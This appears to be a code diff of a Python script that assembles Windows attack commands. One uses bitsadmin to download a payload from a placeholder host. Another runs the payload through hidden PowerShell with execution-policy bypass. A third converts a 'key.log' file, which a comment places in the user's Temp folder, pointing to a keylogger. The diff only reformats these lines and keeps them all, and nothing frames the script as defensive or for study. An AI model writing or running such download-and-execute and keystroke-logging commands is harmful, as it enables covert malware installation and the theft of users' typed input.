@@ -16,10 +16,13 @@ def run_cmd(cmd):
 IP_ADDR = "127.0.0.1"
 PARSE_KEY_SCRIPT = "parse_keys.ps1"
 payload_URL = "https://www.WEBSITE.com/payload"
-cmd_exe = ('cmd.exe /c "bitsadmin /transfer myjob /download /priority high %s' %payload_URL)
+
 cmd_cd = 'cd \\users\\public\\'
-cmd_powershell = ('powershell.exe -NoP -W Hidden -exec bypass -noexit -Command ".\\%s http://%s stopthis"' %(payload_URL.split('/')[len(payload_URL.split('/'))-1], IP_ADDR))
-cmd_convert_logs = ('powershell.exe -exec bypass -Command "& {Import-Module .\\%s ; %s key.log output.log' % (PARSE_KEY_SCRIPT, PARSE_KEY_SCRIPT.split('.')[0]))
+cmd_exe = ('cmd.exe /c "bitsadmin /transfer myjob /download /priority high %s' %payload_URL)
+cmd_powershell = ('powershell.exe -NoP  -W Hidden -exec bypass -noexit -Command ".\\%s http://%s stopthis"'
+               % (payload_URL.split('/')[len(payload_URL.split('/'))-1], IP_ADDR))
+cmd_convert_logs = ('powershell.exe -exec bypass -Command "& {Import-Module .\\%s ; %s key.log output.log'
+               % (PARSE_KEY_SCRIPT, PARSE_KEY_SCRIPT.split('.')[0]))
 
 # OUTPUT LOG IN C:\Users\[user]\AppData\Local\Temp\key.log
 EXECUTION = [cmd_exe, cmd_cd, cmd_powershell]
